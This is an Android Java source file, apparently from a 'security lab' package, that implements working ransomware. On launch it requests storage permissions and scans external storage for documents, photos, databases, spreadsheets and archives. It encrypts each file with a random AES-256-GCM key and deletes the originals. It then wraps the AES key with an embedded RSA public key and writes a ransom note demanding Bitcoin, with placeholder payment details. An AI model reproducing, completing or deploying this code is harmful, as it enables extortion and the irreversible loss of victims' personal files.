package com.security.lab;

import android.Manifest;
import android.app.Activity;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.util.Base64;
import android.widget.TextView;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.security.KeyFactory;
import java.security.PublicKey;
import java.security.SecureRandom;
import java.security.spec.X509EncodedKeySpec;
import java.util.ArrayList;
import java.util.List;

import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.GCMParameterSpec;

public class MainActivity extends Activity {

    // Pure DER base64, single line, no PEM markers, no whitespace.
    private static final String RSA_PUB_B64 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA32NLidU6FpsKK01fSuRaVMkO0JgEZqSsWlswz/HwOV440ycpruIIvUvf2gL181XiOFUkpxXqFGc1sKK2eSWesN+jXb3ckEH0CC7zjeqcmgJ/YT32xTpDu3zsgqPbdtZTYUQUitL2KYnD8SRPIZwWUCT5p1uKj7swLG9AlqMbbX/4Q+adJgwLOgDogXEn+AuBM/3ntgNfOMOnPwcXcYJ2qLyZpcrebBSigwAyyOfvXDu2lZXLClbUuakcCJHjy+Y2DhNV0QGCTAoL6WxgkRSZUleuSKsEynh32knQliSLQ0g+L+jS5kjXwrloP7kBCKwNz8ctvei9dv4WoglDURA9GQIDAQAB";

    private static final int REQ_PERM = 1001;
    private TextView log;

    @Override
    public void onCreate(Bundle state) {
        super.onCreate(state);
        log = new TextView(this);
        log.setPadding(32, 48, 32, 32);
        setContentView(log);

        if (!hasStoragePerms()) {
            requestPermissions(new String[]{
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE
            }, REQ_PERM);
        } else {
            runEncryption();
        }
    }

    private boolean hasStoragePerms() {
        if (Build.VERSION.SDK_INT < 23) return true;
        return checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE)
                    == PackageManager.PERMISSION_GRANTED
            && checkSelfPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE)
                    == PackageManager.PERMISSION_GRANTED;
    }

    @Override
    public void onRequestPermissionsResult(int code, String[] p, int[] res) {
        super.onRequestPermissionsResult(code, p, res);
        if (code == REQ_PERM && res.length > 0
                && res[0] == PackageManager.PERMISSION_GRANTED) {
            runEncryption();
        } else {
            log.setText("Permission denied");
        }
    }

    private void runEncryption() {
        new Thread(() -> {
            try {
                PublicKey pub = loadPublicKey(RSA_PUB_B64);
                SecretKey aes = genAesKey();
                byte[] rsaWrapped = rsaWrap(pub, aes.getEncoded());

                File root = Environment.getExternalStorageDirectory();
                List<File> targets = new ArrayList<>();
                collect(root, targets);

                int done = 0;
                for (File f : targets) {
                    try { encryptFile(f, aes); done++; } catch (Exception ignored) {}
                }

                File note = new File(root, "READ_ME_RANSOM.txt");
                writeNote(note, rsaWrapped);

                final int total = done;
                runOnUiThread(() -> log.setText(
                    "Encrypted: " + total + " files\nNote: " + note.getAbsolutePath()));
            } catch (Throwable e) {
                final String msg = e.toString();
                runOnUiThread(() -> log.setText("ERR: " + msg));
            }
        }).start();
    }

    private static PublicKey loadPublicKey(String raw) throws Exception {
        String cleaned = raw.replaceAll("[^A-Za-z0-9+/=]", "");
        byte[] der = Base64.decode(cleaned, Base64.DEFAULT);
        return KeyFactory.getInstance("RSA")
                .generatePublic(new X509EncodedKeySpec(der));
    }

    private void collect(File dir, List<File> out) {
        File[] list = dir.listFiles();
        if (list == null) return;
        for (File f : list) {
            if (f.isDirectory()) {
                String n = f.getName();
                if (n.equals("Android") || n.equals("data") || n.equals("obb")) continue;
                collect(f, out);
            } else if (isTarget(f.getName())) {
                out.add(f);
            }
        }
    }

    private static boolean isTarget(String n) {
        String[] ext = {".txt",".pdf",".doc",".docx",".jpg",".jpeg",".png",
                        ".db",".sql",".xls",".xlsx",".mp4",".zip",".csv"};
        String lower = n.toLowerCase();
        for (String e : ext) if (lower.endsWith(e)) return true;
        return false;
    }

    private void encryptFile(File in, SecretKey key) throws Exception {
        if (in.getName().endsWith(".enc")) return;
        FileInputStream fis = new FileInputStream(in);
        byte[] plain = new byte[(int) in.length()];
        int total = 0, r;
        while (total < plain.length && (r = fis.read(plain, total, plain.length - total)) > 0) {
            total += r;
        }
        fis.close();

        byte[] iv = new byte[12];
        new SecureRandom().nextBytes(iv);

        Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
        c.init(Cipher.ENCRYPT_MODE, key, new GCMParameterSpec(128, iv));
        byte[] ct = c.doFinal(plain);

        File out = new File(in.getAbsolutePath() + ".enc");
        FileOutputStream fos = new FileOutputStream(out);
        fos.write(iv);
        fos.write(ct);
        fos.close();
        in.delete();
    }

    private static SecretKey genAesKey() throws Exception {
        KeyGenerator kg = KeyGenerator.getInstance("AES");
        kg.init(256);
        return kg.generateKey();
    }

    private byte[] rsaWrap(PublicKey pub, byte[] aesKey) throws Exception {
        Cipher rsa = Cipher.getInstance("RSA/ECB/OAEPPadding");
        rsa.init(Cipher.ENCRYPT_MODE, pub);
        return rsa.doFinal(aesKey);
    }

    private void writeNote(File note, byte[] wrapped) throws Exception {
        StringBuilder sb = new StringBuilder();
        sb.append("YOUR FILES ARE ENCRYPTED.\n");
        sb.append("Pay 0.05 BTC to: bc1qexampleaddressxxxxxxxxxxxxx\n");
        sb.append("Send proof to: example.onion\n\n");
        sb.append("Wrapped AES key (base64):\n");
        sb.append(Base64.encodeToString(wrapped, Base64.NO_WRAP));
        sb.append("\n");
        FileOutputStream fos = new FileOutputStream(note);
        fos.write(sb.toString().getBytes());
        fos.close();
    }
}
